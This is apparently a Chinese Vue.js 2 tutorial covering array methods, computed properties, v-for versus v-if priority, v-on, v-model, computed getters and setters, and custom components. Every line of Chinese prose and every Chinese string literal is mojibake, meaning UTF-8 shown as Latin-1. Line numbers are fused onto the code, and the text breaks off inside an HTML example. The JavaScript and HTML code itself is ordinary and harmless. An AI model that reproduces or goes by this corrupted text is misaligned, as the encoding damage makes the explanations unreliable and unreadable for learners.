ä½¿ç”¨äº†æœƒå½±éŸ¿åŸå§‹é™£åˆ—æœ¬èº«çš„æ–¹æ³•ï¼Œåƒæ˜¯ï¼š push() pop() shift() unshift() splice() sort() reverse() ç•¶é™£åˆ—è¢«æ›´æ–°å¾Œï¼Œç•«é¢å°±æœƒéš¨è‘—é™£åˆ—ä¸­è³‡æ–™çš„æ”¹è®Šä¾†åŒæ­¥æ›´æ–°ã€‚ å¦‚æœä½ ä¸å¸Œæœ›é€™æ¨£çš„è©±ï¼Œå¯ä»¥æ”¹ä½¿ç”¨ä¸å½±éŸ¿åŸå§‹é™£åˆ—çš„æ–¹æ³•ï¼Œåƒæ˜¯ï¼š filter() concat() slice() é€™äº›æ–¹æ³•éƒ½æ˜¯å›å‚³ä¸€å€‹æ–°çš„é™£åˆ—ï¼Œæ‰€ä»¥æ‰ä¸æœƒå½±éŸ¿åˆ°åŸå§‹é™£åˆ—ã€‚ èˆ‰ä¸€å€‹å¸¸è¦‹çš„ä¾‹å­ï¼Œå‡è¨­æˆ‘å€‘æƒ³è¦å°ä¸€ä»½è³‡æ–™åšç¯©é¸ï¼Œé€™æ™‚ä¸¦ä¸æœƒå¸Œæœ›ç›´æ¥å»å‹•åŸæœ¬çš„è³‡æ–™ï¼Œè€Œæ˜¯èƒ½å¤ å†ç”¢ç”Ÿå‡ºä¸€ä»½ç¯©é¸éå¾Œçš„è³‡æ–™ã€‚ é€™å€‹æ™‚å€™å°±å¯ä»¥åˆ©ç”¨ä¸Šé¢æçš„æ–¹æ³•ä»¥åŠ computed å±¬æ€§ä¾†å¯¦ä½œã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556let vm = new Vue({ el: '#app', data: { // â†“ æ‰€æœ‰çš„é …ç›® mantous: [ 'è›‹é»ƒé®®è‚‰åŒ…', 'é¦™è‡è–‘æ±é®®è‚‰åŒ…', 'é»‘ç±³æ¤°é¦™èŠ‹é ­åŒ…', 'é»‘ç³–åœ°ç“œåŒ…', 'è”¥è‚‰åŒ…', 'å’–å•¡å¥¶é…¥é¥…é ­', 'å…¨éº¥å …æœé¥…é ­', 'é»‘ç³–æ¡‚åœ“æ¸æé¥…é ­', 'è”¥èŠ±æ²é¥…é ­', 'é»‘ç³–é¥…é ­', 'é®®å¥¶é¥…é ­', 'èŠ‹ç±¤é¥…é ­', 'å±±æ±é¥…é ­', 'å…¨éº¥é¥…é ­', 'ç´…è—œå…¨éº¥é¥…é ­', 'èµ·å¸è‚‰åŒ…', 'å…¨éº¥é›œç³§é¥…é ­', 'èŠ‹æ³¥æ²', 'èŠ‹æ³¥é¥…é ­', 'åœ°ç“œèŠ‹é ­é¥…é ­', 'èŠ‹åœ“é¥…é ­' ] }, // â†“ ç¯©é¸éå¾Œçš„é …ç›® computed: { // â†“ èŠ‹é ­æ§ taros: function () { return this.mantous.filter(function (item) { return item.includes('èŠ‹') }) }, // â†“ è‚‰è‚‰æ§ meats: function () { return this.mantous.filter(function (item) { return item.includes('è‚‰') }) }, // â†“ é»‘ç³–æ§ brownSugar: function () { return this.mantous.filter(function (item) { return item.includes('é»‘ç³–') }) }, // â†“ é¤Šç”Ÿæ§ healthy: function () { return this.mantous.filter(function (item) { return item.includes('éº¥') }) } }}) ğŸš€ Codepenï¼šé»é€™è£¡ v-for æ¯” v-if çš„å„ªå…ˆæ¬Šé«˜é€™è£¡å…ˆåƒè€ƒ Vue çš„ä¸€æ®µæºç¢¼ï¼š 1234567891011121314151617181920212223export function genElement (el: ASTElement, state: CodegenState): string { if (el.parent) { el.pre = el.pre || el.parent.pre } if (el.staticRoot &amp;&amp; !el.staticProcessed) { return genStatic(el, state) } else if (el.once &amp;&amp; !el.onceProcessed) { return genOnce(el, state) // åŸ·è¡Œ v-for } else if (el.for &amp;&amp; !el.forProcessed) { return genFor(el, state) // åŸ·è¡Œ v-if } else if (el.if &amp;&amp; !el.ifProcessed) { return genIf(el, state) } else if (el.tag === 'template' &amp;&amp; !el.slotTarget &amp;&amp; !state.pre) { return genChildren(el, state) || 'void 0' } else if (el.tag === 'slot') { return genSlot(el, state) } else { // component or element ...} å¾æºç¢¼ä¸­å¯ä»¥çœ‹åˆ°ï¼Œv-for æœƒå…ˆåŸ·è¡Œï¼Œæ¥è‘—æ‰åŸ·è¡Œ v-ifï¼Œæ‰€ä»¥ v-for çš„å„ªå…ˆæ¬Šæ¯” v-if ä¾†å¾—é«˜ã€‚ è€Œå¦‚æœæˆ‘å€‘åœ¨ä¸€å€‹å…ƒç´ ä¸ŠåŒæ™‚é€²è¡Œ v-for è·Ÿ v-ifï¼Œä»£è¡¨ v-if åœ¨æ¯ä¸€æ¬¡çš„å¾ªç’°ä¸­éƒ½æœƒè¢«åŸ·è¡Œä¸€æ¬¡ã€‚ é€™æ¨£å­çš„ä½œæ³•æ˜¯æ¯”è¼ƒæµªè²»æ•ˆèƒ½çš„ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å€‘åªæƒ³é¡¯ç¤ºåº«å­˜ç”¢å“ï¼Œä½†æˆ‘å€‘æ¯æ¬¡åœ¨æ¸²æŸ“çš„æ™‚å€™ï¼Œéƒ½å¾—å…ˆè¿­ä»£æ‰€æœ‰ç”¢å“ï¼Œå†å¾æ‰€æœ‰ç”¢å“ä¸­åˆ¤æ–·è©²ç”¢å“æ˜¯å¦é‚„æœ‰åº«å­˜ã€‚ 12345678&lt;h2 class=\"title\"&gt;è²©å”®ä¸­&lt;/h2&gt;&lt;ul class=\"list\"&gt; &lt;!-- â†“ 1. å¾ªç’°æ‰€æœ‰ç”¢å“ --&gt; &lt;!-- â†“ 2. åˆ¤æ–·ç”¢å“æ•¸é‡ --&gt; &lt;li class=\"btn\" v-for=\"mantou in mantous\" v-if=\"mantou.quantity\"&gt; {{ mantou.name }} &lt;/li&gt;&lt;/ul&gt; 123456789101112131415161718192021222324252627let vm = new Vue({ el: '#app', data: { mantous: [ { name: 'è›‹é»ƒé®®è‚‰åŒ…', quantity: 10 }, { name: 'é¦™è‡è–‘æ±é®®è‚‰åŒ…', quantity: 0 }, { name: 'é»‘ç±³æ¤°é¦™èŠ‹é ­åŒ…', quantity: 10 }, { name: 'é»‘ç³–åœ°ç“œåŒ…', quantity: 0 }, { name: 'è”¥è‚‰åŒ…', quantity: 0 }, { name: 'å’–å•¡å¥¶é…¥é¥…é ­', quantity: 0 }, { name: 'å…¨éº¥å …æœé¥…é ­', quantity: 10 }, { name: 'é»‘ç³–æ¡‚åœ“æ¸æé¥…é ­', quantity: 10 }, { name: 'è”¥èŠ±æ²é¥…é ­', quantity: 0 }, { name: 'é»‘ç³–é¥…é ­', quantity: 0 }, { name: 'é®®å¥¶é¥…é ­', quantity: 10 }, { name: 'èŠ‹ç±¤é¥…é ­', quantity: 0 }, { name: 'å±±æ±é¥…é ­', quantity: 0 }, { name: 'å…¨éº¥é¥…é ­', quantity: 10 }, { name: 'ç´…è—œå…¨éº¥é¥…é ­', quantity: 0 }, { name: 'èµ·å¸è‚‰åŒ…', quantity: 0 }, { name: 'å…¨éº¥é›œç³§é¥…é ­', quantity: 0 }, { name: 'èŠ‹æ³¥æ²', quantity: 0 }, { name: 'èŠ‹æ³¥é¥…é ­', quantity: 10 }, { name: 'èŠ‹åœ“é¥…é ­', quantity: 10 } ] }}) ğŸš€ Codepenï¼šé»é€™è£¡ æƒ³åƒä¸€ä¸‹å¦‚æœæœ‰ 10 å€‹åœ°æ–¹éƒ½æœƒç”¨åˆ°è²©å”®ä¸­çš„é€™ä»½æ¸…å–®ï¼Œé‚£ä¸Šé¢çš„æµç¨‹å°±å¾—è·‘ 10 æ¬¡ï¼Œé€™é¡¯ç„¶ä¸æ˜¯å€‹å¥½åšæ³•å°å§ï¼Ÿ æ¯”è¼ƒå¥½çš„åšæ³•æ˜¯æŠŠè²©å”®ä¸­çš„é€™ä»½æ¸…å–®å…ˆé€é computed å…ˆåšéæ¿¾ï¼Œä¸¦ä¸”æŠŠçµæœç·©å­˜èµ·ä¾†ã€‚ 123456&lt;h2 class=\"title\"&gt;è²©å”®ä¸­&lt;/h2&gt;&lt;ul class=\"list\"&gt; &lt;!-- â†“ ä½¿ç”¨ computed --&gt; &lt;!-- â†“ å¾ªç’°å°šæœ‰åº«å­˜çš„ç”¢å“ --&gt; &lt;li class=\"btn\" v-for=\"mantou in inStock\"&gt;{{ mantou.name }}&lt;/li&gt;&lt;/ul&gt; 12345678computed: { // â†“ ç”¢ç”Ÿåº«å­˜å•†å“åˆ—è¡¨ inStock: function () { return this.mantous.filter(function (item) { return item.quantity }) }} ğŸš€ Codepenï¼šé»é€™è£¡ ç¾åœ¨v-foråªéœ€è¦è¿­ä»£ inStock æ¸…å–®ä¸­çš„è³‡æ–™ï¼Œè€Œä¸æ˜¯æ•´å€‹ç”¢å“åˆ—è¡¨ã€‚ è€Œ computed å…·æœ‰ç·©å­˜çš„ç‰¹æ€§ï¼Œæ‰€ä»¥å³ä¾¿æœ‰ 3 ä»½è²©å”®ä¸­çš„æ¸…å–®ï¼Œv-ifå¯¦éš›ä¸Šä¹Ÿåªéœ€è¦åˆ¤æ–·ä¸€æ¬¡ã€‚ å¦å¤–ä¸€ç¨®æƒ…æ³ é™¤äº†å‰›å‰›æ‰€èªªçš„ä»¥å¤–ï¼Œé‚„æœ‰ä¸€ç¨®æƒ…æ³æ˜¯ï¼Œå…ˆç”¨ v-if åˆ¤æ–·æ˜¯å¦è¦é¡¯ç¤ºï¼Œåœ¨é€²è¡Œ v-for å¾ªç’°ã€‚ å¦‚æœæ˜¯é€™ç¨®æƒ…æ³çš„è©±ï¼Œå¯ä»¥æŠŠ v-if å¯«åœ¨ å¤–å±¤å…ƒç´  æˆ– &lt;template&gt; ä¾†åˆ¤æ–·ï¼Œè¦å¾ªç’°çš„å…ƒç´ å¯«åœ¨å…§å±¤ã€‚ 12345&lt;h2 class=\"title\"&gt;è²©å”®ä¸­&lt;/h2&gt;&lt;!-- åˆ—è¡¨ä¸­æœ‰æ¸…å–®æ™‚æ‰åŸ·è¡Œå…§éƒ¨çš„å¾ªç’° --&gt;&lt;ul class=\"list\" v-if=\"mantous.length\"&gt; &lt;li class=\"btn\" v-for=\"mantou in mantous\"&gt;{{ mantou.name }}&lt;/li&gt;&lt;/ul&gt; æƒ³æƒ³çœ‹ï¼Œå¦‚æœæŠŠ v-if å¯«åœ¨ &lt;li&gt; çš„è©±ï¼Œæœƒè®Šä»€éº¼æ¨£å­ï¼Ÿ ç­”æ¡ˆæ˜¯æœƒåŸ·è¡Œ v-forï¼Œæ¥è‘—åŸ·è¡Œ v-ifã€‚ å› ç‚º v-for çš„å„ªå…ˆæ¬Šæ¯” v-if é«˜ï¼Œæ‰€ä»¥å³ä¾¿æ²’æœ‰è³‡æ–™ï¼Œ v-for é‚„æ˜¯æœƒå…ˆåŸ·è¡Œï¼Œæ¥è‘—æ‰åŸ·è¡Œ v-ifã€‚ v-on äº‹ä»¶ç¶å®šé€év-onå¯ä»¥ç¶å®šäº‹ä»¶åˆ°ä¸€å€‹å…ƒç´ ä¸Šï¼Œä¸¦è¨­å®šä¸€å€‹è™•ç†äº‹ä»¶çš„ function 1234567&lt;div id=\"app\"&gt; &lt;!-- â†“ å¯«å…¥ counter çš„å€¼ --&gt; &lt;p&gt;Count: &lt;span&gt;{{ counter }}&lt;/span&gt;&lt;/p&gt; &lt;!-- â†“ åœ¨ button ä¸Šç¶å®š click äº‹ä»¶ --&gt; &lt;!-- â†“ åŸ·è¡Œ addNumber å‡½å¼ --&gt; &lt;button v-on:click=\"addNumber\"&gt;é»æˆ‘RRRRRR&lt;/button&gt;&lt;/div&gt; 12345678910111213let app = new Vue({ el: '#app', data: { counter: 0 }, methods: { addNumber: function () { this.counter++ } }}) æœ‰ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…æ˜¯ï¼Œåœ¨æˆ‘å€‘çš„åŸå§‹ç¢¼ç•¶ä¸­ï¼Œä¸¦æ²’æœ‰å° DOM åšä»»ä½•æ›´æ–°å…§å®¹çš„æ“ä½œã€‚ é€™éƒ¨åˆ† Vue éƒ½å¹«æˆ‘å€‘ç›´æ¥è™•ç†å¥½äº†ï¼Œæ‰€ä»¥ç¾åœ¨æˆ‘å€‘åªéœ€è¦å°ˆæ³¨åœ¨ç¨‹å¼çš„å±¤é¢ä¸Šã€‚ ğŸ’¡ è¨»ï¼šæ­¤è™•çš„thisæŒ‡å‘çš„æ˜¯ app é€™å€‹ Vue çš„ç‰©ä»¶å¯¦é«”ã€‚ ç¸®å¯«v-ç³»åˆ—çš„ç›¸é—œæŒ‡ä»¤å…¶å¯¦éƒ½æœ‰ä¸€å¥—ç¸®å¯«çš„å¯«æ³•ã€‚ v-bindç¸®å¯« 12345678&lt;!-- â†“ å®Œæ•´èªæ³• --&gt;&lt;a v-bind:href=\"url\"&gt;...&lt;/a&gt;&lt;!-- â†“ ç¸®å¯« --&gt;&lt;a :href=\"url\"&gt;...&lt;/a&gt;&lt;!-- â†“ å‹•æ…‹åƒæ•¸çš„ç¸®å¯« --&gt;&lt;a :[key]=\"url\"&gt;...&lt;/a&gt; v-onç¸®å¯« 12345678&lt;!-- â†“ å®Œæ•´èªæ³• --&gt;&lt;button v-on:click=\"doSomething\"&gt;Click Me&lt;/button&gt;&lt;!-- â†“ ç¸®å¯« --&gt;&lt;button @click=\"doSomething\"&gt;Click Me&lt;/button&gt;&lt;!-- â†“ å‹•æ…‹åƒæ•¸çš„ç¸®å¯« --&gt;&lt;button @[event]=\"doSomething\"&gt;Click Me&lt;/button&gt; v-cloakå¦‚æœæ²’ç”¨é€™å€‹å±¬æ€§çš„è©±ï¼Œä½ å¯èƒ½å°±æœƒåœ¨ç¶²é è¼‰å…¥æ™‚çœ‹åˆ° {{ msg }} ä¹‹é¡çš„è®Šæ•¸ã€‚ è¦é¿å…é€™å€‹æƒ…æ³åªéœ€è¦åŠ ä¸Šv-cloaké€™å€‹å±¬æ€§è·Ÿä¸€é»é» CSS å³å¯è§£æ±ºã€‚ 123&lt;div id=\"app\"&gt; &lt;p&gt;{{ msg }}&lt;/p&gt;&lt;/div&gt; 123[v-cloak] { display: none;} v-model é›™å‘ç¶å®šé€év-modelå¯ä»¥è®“è³‡æ–™æ˜¯é›™å‘ç¶å®šçš„ç‹€æ…‹ï¼Œæ„æ€æ˜¯æŒ‡ data è·Ÿ å…ƒç´  çš„å€¼æœƒæ˜¯ç›¸é€šçš„ã€‚ 123456&lt;div id=\"app\"&gt; &lt;!-- â†“ æŠŠ input çš„å€¼è·Ÿ message çš„å€¼ç¶åœ¨ä¸€èµ· --&gt; &lt;input type=\"text\" v-model=\"message\" /&gt; &lt;!-- â†“ é¡¯ç¤º message çš„å€¼ --&gt; &lt;p&gt;{{ message }}&lt;/p&gt;&lt;/div&gt; 1234567let app = new Vue({ el: '#app', data: { message: '' }}) æ‰€ä»¥ä½ èƒ½çœ‹åˆ°ï¼Œç•¶ &lt;input&gt; çš„å€¼æ”¹è®Šæ™‚ï¼Œmessage çš„å€¼æœƒè·Ÿè‘—æ”¹è®Šï¼Œå°è‡´&lt;p&gt;çš„æ–‡å­—è·Ÿè‘—æ”¹è®Šã€‚ èƒŒå¾Œçš„åŸç†å…¶å¯¦v-modelåªæ˜¯å¹«ä½ åšäº†å…©ä»¶äº‹æƒ…ï¼š åœ¨å…ƒç´ ä¸Šç¶å®š v-bind:value ç•¶inputäº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œæ›´æ”¹ Vue ä¸­çš„è³‡æ–™å€¼ æ‰€ä»¥å‰é¢çš„ç¯„ä¾‹ç­‰åŒæ–¼ï¼š 1234567&lt;div id=\"app\"&gt; &lt;!-- â†“ æŠŠ value å±¬æ€§ç¶å®šåˆ° Vueä¸­çš„ message --&gt; &lt;!-- â†“ ç›£è½ input äº‹ä»¶ --&gt; &lt;input type=\"text\" v-bind:value=\"message\" v-on:input=\"changeMessage\" /&gt; &lt;!-- â†“ é¡¯ç¤º message çš„å€¼ --&gt; &lt;p&gt;{{ message }}&lt;/p&gt;&lt;/div&gt; 123456789101112131415let vm = new Vue({ el: '#app', data: { // â†“ åˆå§‹å€¼è¨­ç‚ºç©ºå­—ä¸² message: '' }, methods: { // â†“ inputäº‹ä»¶ç™¼ç”Ÿæ™‚çš„è™•ç†å‡½å¼ changeMessage: function () { // â†“ é€é event å–å‡º input çš„å€¼ // â†“ å°‡ message çš„å€¼æ›´æ–° this.message = event.target.value } }}) æ‰€ä»¥v-modelå°±æ˜¯å€‹ :value + @input çš„èªæ³•ç³–ï¼Œèƒ½å¤ å¹«ä½ å‰©ä¸‹äº†ä¸€äº›åŠŸå¤«ã€‚ä½†è©¦è‘—äº†è§£å®ƒåœ¨èƒŒå¾Œåšäº†ä»€éº¼ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚ computed è¨ˆç®—å±¬æ€§é›–ç„¶åœ¨{{ }}ä¸­å¯ä»¥ç›´æ¥å¸¶å…¥è¡¨é”å¼ä¾†ç”¢å‡ºæƒ³è¦çš„è³‡æ–™ï¼Œä½†å¸¸å¸¸åœ¨è£¡é¢åšå¾ˆè¤‡é›œçš„é‹ç®—ä¸¦ä¸æ˜¯ä¸€ä»¶å¥½äº‹å§ï¼Ÿ 1234567let vm = new Vue({ el: '#app', data: { firstName: 'ç…‰ç„', lastName: 'æå£½éƒ' }}) 1&lt;p&gt;{{firstName + 'ï¼' + lastName}}&lt;/p&gt; ğŸ’¡ è¨»ï¼šåœ–ç‰‡ä¾†æº å¦‚æœæˆ‘å€‘æƒ³è¦ç§€å‡ºå¥½å¹¾å€‹å¤§å“¥çš„åå­—ï¼Œé‚£å°±å¾—ä¸€ç›´åšé‡è¤‡çš„é‹ç®—ï¼Œé¡¯ç„¶ä¸æ˜¯ä»¶å¥½äº‹ã€‚ ç‚ºäº†é¿å…é€™ç¨®é‡è¤‡è¨ˆç®—çš„äº‹æƒ…ç™¼ç”Ÿï¼Œå¯ä»¥ä½¿ç”¨computedå±¬æ€§ä¾†æ”¹å–„é€™å€‹å•é¡Œã€‚ 123456789101112131415let vm = new Vue({ el: '#app', data: { firstName: 'ç…‰ç„', lastName: 'æå£½éƒ' }, // â†“ ä½¿ç”¨ computed å±¬æ€§ computed: { // â†“ æŠŠé‹ç®—çµæœçµ¦ç·©å­˜ fullName: function () { return this.firstName + 'ï¼' + this.lastName } }}) ç¾åœ¨ä½ æƒ³ç§€å¹¾å€‹å¤§å“¥çš„åç¨±éƒ½æ²’å•é¡Œå›‰ï¼ 12345&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt; é€™æ¨£å­çš„å¥½è™•ä¸¦ä¸åªæ˜¯çœ‹èµ·ä¾†æ¯”è¼ƒç°¡æ½”è€Œå·²ï¼Œè€Œæ˜¯computedå±¬æ€§å…·æœ‰ç·©å­˜çš„ä½œç”¨ã€‚ å‰›å‰›è¨­ç½®çš„fullNameï¼Œæ˜¯è—‰ç”±firstNameè·ŸlastNameä¾†æ±‚å‡ºæœ€å¾Œçš„å€¼ï¼Œæ‰€ä»¥é€™å…©å€‹å€¼éƒ½æ²’æœ‰æ”¹è®Šçš„è©±ï¼ŒfullNameå€¼æ˜¯ä¸æœƒæ”¹è®Šçš„ï¼Œä¹Ÿå°±æ˜¯èªªï¼ŒfullNameä¸éœ€è¦é‡æ–°è¨ˆç®—ä¾†æ±‚å€¼ï¼Œé€™ä¹Ÿå°±æ˜¯ç·©å­˜çš„ç”¨æ„ã€‚ computed èˆ‡ methodså‰é¢çš„ç¯„ä¾‹ä¹Ÿèƒ½æ”¹ç”¨ methods ä¾†åšå‡ºä¸€æ¨£çš„çµæœï¼Œä¸é methods èˆ‡ computed æœ€å¤§çš„å·®ç•°åœ¨æ–¼ï¼š å‘¼å« methods å¹¾æ¬¡ï¼Œå‡½å¼å°±æœƒåŸ·è¡Œå¹¾æ¬¡ ç•¶ computed ä¾è³´çš„å±¬æ€§æ²’æœ‰ç™¼ç”Ÿæ”¹è®Šæ™‚ï¼Œä¸ç®¡å‘¼å«å¹¾æ¬¡ computedï¼Œå‡½å¼éƒ½åªæœƒåŸ·è¡Œä¸€æ¬¡ã€‚ 123456789101112131415161718192021let vm = new Vue({ el: '#app', data: { firstName: 'ç…‰ç„', lastName: 'æå£½éƒ' }, // â†“ ç”¨ methods ä¾†è¨ˆç®—å¤§å“¥çš„å…¨å methods: { getfullName: function () { console.log('åŸ·è¡ŒgetfullName') return `${this.firstName}ï¼${this.lastName}` } }, // â†“ ç”¨ computed ä¾†ç·©å­˜å¤§å“¥çš„å…¨å computed: { fullName: function () { console.log('åŸ·è¡ŒfullName') return `${this.firstName}ï¼${this.lastName}` } }}) 123456&lt;p&gt;{{ getfullName() }}&lt;/p&gt;&lt;p&gt;{{ getfullName() }}&lt;/p&gt;&lt;p&gt;{{ getfullName() }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt;&lt;p&gt;{{ fullName }}&lt;/p&gt; consoleä¸­å°è­‰äº†æˆ‘å€‘å‰›å‰›æ‰€èªªçš„ï¼Œæˆ‘å€‘å‘¼å«äº†getfullName()3 æ¬¡ï¼Œæ•…å‡½å¼åŸ·è¡Œäº† 3 æ¬¡ï¼Œè€ŒfullNameåªæœ‰åŸ·è¡Œä¸€æ¬¡ï¼Œå› ç‚ºfirstNameè·ŸlastNameéƒ½æ²’æœ‰ç™¼ç”Ÿæ”¹è®Šã€‚ getter èˆ‡ settercomputed é‚„å¯ä»¥ç´°åˆ†ç‚º getter(è®€å–) èˆ‡ setter(å¯«å…¥)é€™å…©ç¨®åŠŸèƒ½ã€‚ åœ¨æ²’æœ‰ç‰¹åˆ¥è¨­å®šæ™‚ï¼Œé è¨­åªæœƒæœ‰getterçš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯åªèƒ½è®€å–ï¼Œä¸èƒ½å¯«å…¥ã€‚ å¦‚åœ–æ‰€ç¤ºï¼Œæˆ‘å€‘åªèƒ½é€éä¿®æ”¹ firstName æˆ– lastName ä¾†æ›´æ–° fullName çš„å€¼ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¿®æ”¹ fullName ã€‚ åœ¨å‰é¢çš„ç¯„ä¾‹ä¸­æˆ‘å€‘éƒ½é€é computed ä¾†è®€å–è³‡æ–™ï¼Œä½†å‰é¢ä½¿ç”¨çš„æ˜¯çœç•¥çš„å¯«æ³•ï¼Œå®Œæ•´çš„å¯«æ³•å¦‚ä¸‹ã€‚ 1234567891011121314151617let vm = new Vue({ el: '#app', data: { firstName: 'ç…‰ç„', lastName: 'æå£½éƒ' }, computed: { fullName: { // â†“ è¨­å®š getter get: function () { // â†“ è®€å–å¤§å“¥çš„å…¨å return this.firstName + 'ï¼' + this.lastName } } }}) å¦‚æœè¦ä½¿ç”¨setterçš„åŠŸèƒ½ï¼Œå°±è¦åƒä¸‹é¢é€™æ¨£å­å¯«ã€‚ 12&lt;!-- â†“ æŠŠ input çš„å€¼è·Ÿ fullName ç¶åœ¨ä¸€èµ· --&gt;&lt;input type=\"text\" v-model=\"fullName\" /&gt; 12345678910111213141516171819let vm = new Vue({ el: '#app', data: { firstName: 'ç…‰ç„', lastName: 'æå£½éƒ' }, computed: { fullName: { get: function () { return this.firstName + 'ï¼' + this.lastName }, // â†“ è¨­å®š setter æ–¹æ³• set: function (newValue) { console.log('è§¸ç™¼setter') } } }}) ç¾åœ¨æˆ‘å€‘ç”¨v-modelå¼·åˆ¶æŠŠ input è·Ÿ fullName çš„å€¼ç¶åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥ç•¶ inputå€¼æ”¹è®Šæ™‚ï¼Œå°±æœƒå»è®Šæ›´ fullNameçš„å€¼ï¼Œé€™å€‹æ™‚å€™å°±æœƒè§¸ç™¼æˆ‘å€‘åœ¨set å‡½å¼ä¸­æ‰€åšçš„è¨­å®šã€‚ ä½ å¯èƒ½æœƒæœ‰å€‹ç–‘å•ï¼Œæˆ‘å€‘ä¸æ˜¯ä¿®æ”¹äº†fullNameçš„å€¼å—ï¼ŸfullNameçš„è³‡æ–™æ€éº¼æ²’æœ‰æ›´æ–°ï¼Ÿ é€™æ˜¯å› ç‚ºåœ¨setå‡½å¼ä¸­ï¼Œä¸¦æ²’æœ‰æœƒè§¸ç™¼getçš„è¨­å®šã€‚ æ—¢ç„¶getæ²’æœ‰è¢«è§¸ç™¼çš„è©±ï¼ŒfullNameçš„å€¼å°±ä¸æœƒè¢«é‡æ–°è¨ˆç®—ï¼Œè€Œç•«é¢ä¹Ÿè‡ªç„¶ä¸æœƒé‡æ–°æ¸²æŸ“ã€‚ é‚£è¦æ€éº¼è®“getè§¸ç™¼ï¼Ÿæˆ‘å€‘åªè¦åœ¨setä¸­åšæœƒè§¸ç™¼getçš„äº‹æƒ…å°±å¯ä»¥äº†ã€‚ 123456789101112131415161718192021222324252627282930let vm = new Vue({ el: '#app', data: { firstName: 'ç…‰ç„', lastName: 'æå£½éƒ' }, computed: { fullName: { // getter get: function () { console.log('è§¸ç™¼getter') return this.firstName + ' ' + this.lastName }, // setter set: function (newValue) { console.log('è§¸ç™¼setter') // â†“ newValue åƒæ•¸ç‚º input çš„å€¼ let names = newValue.split(' ') // â†“ æ›´æ–° firsName çš„å€¼ this.firstName = names[0] // â†“ æ›´æ–° lastName çš„å€¼ this.lastName = names[names.length - 1] } } }, // â†“ ç•«é¢é‡æ–°æ¸²æŸ“æ™‚æœƒè§¸ç™¼çš„å‡½å¼ updated() { console.log('é‡æ–°æ¸²æŸ“ç•«é¢') }}) ç¾åœ¨ç•¶setè§¸ç™¼æ™‚ï¼Œæˆ‘å€‘ä¿®æ”¹ firstName èˆ‡ lastName çš„å€¼ï¼Œé€™å€‹æ™‚å€™å°±æœƒè§¸ç™¼ get å»é‡æ–°è¨ˆç®— fullName çš„å€¼ï¼Œä¸¦ä¸”é‡æ–°æ¸²æŸ“ç•«é¢ã€‚ æ‰€ä»¥é †åºæ˜¯é€™æ¨£å­çš„ï¼š set â†’ get â†’ updated è¦æ³¨æ„çš„é‡é»æ˜¯ï¼š ä»€éº¼æ™‚å€™æœƒè§¸ç™¼ getï¼Ÿç•¶firstNameèˆ‡ lastName è®Šæ›´æ™‚ã€‚ï¼ˆå‰ææ˜¯æ¨¡æ¿ä¸­æœ‰ç”¨åˆ° computed è¨­å®šçš„ fullName å±¬æ€§ï¼‰ ä»€éº¼æ™‚å€™æœƒè§¸ç™¼ setï¼Ÿç•¶fullNameè®Šæ›´æ™‚ã€‚(v-modelç¶å®šå€¼) ä»€éº¼æ™‚å€™æœƒé‡æ–°æ¸²æŸ“ç•«é¢ï¼Ÿç•¶æ¨¡æ¿ä¸­çš„è³‡æ–™ï¼ˆæ­¤è™•çš„è©±æ˜¯fullNameï¼‰æ›´æ–°æ™‚ã€‚ æ‰€ä»¥åšå€‹ç¸½çµï¼š get èˆ‡ set å…©è€…æ˜¯ç¨ç«‹çš„ï¼Œä¸¦ä¸æ˜¯ è§¸ç™¼ set å°±æœƒè§¸ç™¼ getã€‚ è¦è§¸ç™¼getçš„å‰ææ¢ä»¶æ˜¯ï¼Œæ¨¡æ¿ä¸­æœ‰ä½¿ç”¨åˆ°å…¶ computed çš„å±¬æ€§ã€‚ è‡ªå®šç¾©çµ„ä»¶åœ¨ Vue ä¸­å¯ä»¥é€éå»ºç«‹ä¸€å€‹ instance (å¯¦é«”) ä¾†å‰µé€ è‡ªå·±çš„ component (çµ„ä»¶)ã€‚ æ ¼å¼ï¼šVue.component(name, {}) ç¬¬ä¸€å€‹åƒæ•¸ç‚º Stringï¼Œä»£è¡¨ component çš„åç¨±ã€‚ ç¬¬äºŒå€‹åƒæ•¸ç‚ºé¸é … Objectï¼Œç”¨ä¾†å°çµ„ä»¶åšè¨­å®šã€‚ ğŸ’¡ è¨» ï¼šçµ„ä»¶å°±è·Ÿ new Vue ä¸€æ¨£ï¼Œå¯ä»¥æœ‰ dataã€computedã€watchã€methodsåŠ hook functionç­‰ã€‚ 1234567891011121314151617181920212223242526// â†“ å»ºç«‹ä¸€å€‹æ–°çš„ component// â†“ ç¬¬ä¸€å€‹åƒæ•¸ç‚º \"çµ„ä»¶åç¨±\"// â†“ ç¬¬äºŒå€‹åƒæ•¸ç‚º \"é¸é …ç‰©ä»¶\"Vue.component('counter', { // â†“ è¨­å®š \"æ¨£æ¿\" ä¸­çš„å…§å®¹ // â†“ é€™å€‹å¯«æ³•ç¨±ç‚º å­—ä¸²æ¨¡æ¿ (String template) template: '&lt;button v-on:click=\"addOne\"&gt;{{ count }}&lt;/button&gt;', // â†“ çµ„ä»¶è‡ªå·±çš„ data // â†“ å¿…é ˆç”¨ function + return ç‰©ä»¶çš„æ–¹å¼ä¾†è¨­å®š data() { return { count: 0 } }, // â†“ å‡½å¼å‰‡æ˜¯ä¸€æ¨£ä½¿ç”¨ property ä¾†è¨­å®š methods: { addOne: function () { this.count++ } }})let app = new Vue({ el: '#app'}) æ¥è‘—å°±èƒ½åœ¨ HTML ä¸­ä½¿ç”¨å‰›å‰›è‡ªå®šç¾©çš„çµ„ä»¶åç¨±ä¾†ä½œç‚º tag 12345678910&lt;div id=\"app\"&gt; &lt;ul&gt; &lt;!-- â†“ æ‹¿æˆ‘å€‘åœ¨ Vueå»ºç«‹çš„ Component ä¾†ä½¿ç”¨ --&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; 